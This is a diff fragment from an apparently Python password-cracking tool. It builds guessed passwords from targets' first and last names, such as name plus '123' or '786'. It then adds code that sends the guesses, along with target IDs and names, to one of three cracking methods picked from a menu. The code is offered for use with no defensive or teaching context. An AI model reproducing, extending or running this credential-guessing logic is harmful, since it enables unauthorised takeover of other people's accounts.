@@ -697,7 +697,12 @@ def gmail():
                         fs = first_name.lower()
                         ls = last_name.lower()
                         passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-			
+			if mthd in ['1','01']:
+				crack_submit.submit(ffb,ids,names,passlist)
+			elif mthd in ['2','02']:
+				crack_submit.submit(mmm,ids,names,passlist)
+			else:
+				crack_submit.submit(api,ids,names,passlist)
         print('\033[1;37m')
         linex()
         print(' The process has completed')
